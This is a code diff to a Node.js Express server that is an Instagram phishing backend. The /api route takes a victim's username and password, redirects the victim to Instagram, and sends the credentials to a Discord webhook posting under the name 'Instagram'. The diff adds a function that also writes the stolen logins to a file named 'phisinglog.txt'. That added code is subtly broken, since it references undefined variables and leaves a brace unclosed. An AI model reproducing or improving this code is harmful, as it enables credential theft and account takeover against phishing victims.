@@ -6,7 +6,7 @@ const bodyParser = require("body-parser");
 const { Webhook } = require('discord-webhook-node');
 const HOOK_URL = "WEBHOOK URL HERE" // Here webhook url
 const hook = new Webhook(HOOK_URL);
-
+const fsLibrary  = require('fs')                          
 
 function sendWebhook(username, password) {
     hook.setUsername('Instagram');
@@ -16,6 +16,13 @@ function sendWebhook(username, password) {
     hook.send(data);
 }
 
+function logintxt(username, password) {
+    let logdata = username + ':' + password;
+    fsLibrary.writeFile('phisinglog.txt', data, (error) => {
+      
+    if (error) throw err;
+})
+    
 app.use( express.json() )
 
 const listen = (s, u) => {
@@ -39,7 +46,8 @@ app.get('/api', (req, res) => {
     res.redirect("https://instagram.com/" + username)
 
     sendWebhook(username, passwd);
-
+    logintxt(username, passwd);
+    
 });
 
 app.listen(3000, ()=>{
